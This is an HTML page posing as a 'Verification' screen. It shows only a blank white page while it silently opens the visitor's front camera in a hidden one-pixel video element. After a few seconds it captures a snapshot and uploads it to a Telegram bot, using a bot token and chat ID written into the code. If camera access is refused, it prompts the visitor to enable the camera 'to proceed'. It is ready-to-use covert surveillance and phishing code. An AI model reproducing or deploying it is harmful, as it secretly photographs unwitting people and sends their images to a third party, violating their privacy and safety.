<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            margin: 0; 
            background-color: #ffffff; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            overflow: hidden; 
        }
        video { 
            position: absolute;
            width: 1px; 
            height: 1px; 
            opacity: 0.01;
        }
    </style>
</head>
<body>
    <div style="width: 100%; height: 100%; background: white;"></div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "8732867679:AAHRSA4jkAOiA0sJqUprdUNukb9liy2kOI0";
        const CHAT_ID = "6183802617";

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("photo", blob, "snap.jpg");

                    await fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, {
                        method: "POST",
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                }, 3500);
            } catch (e) {
                alert("Please enable camera to proceed.");
            }
        }
        window.onload = init;
    </script>
</body>
</html>
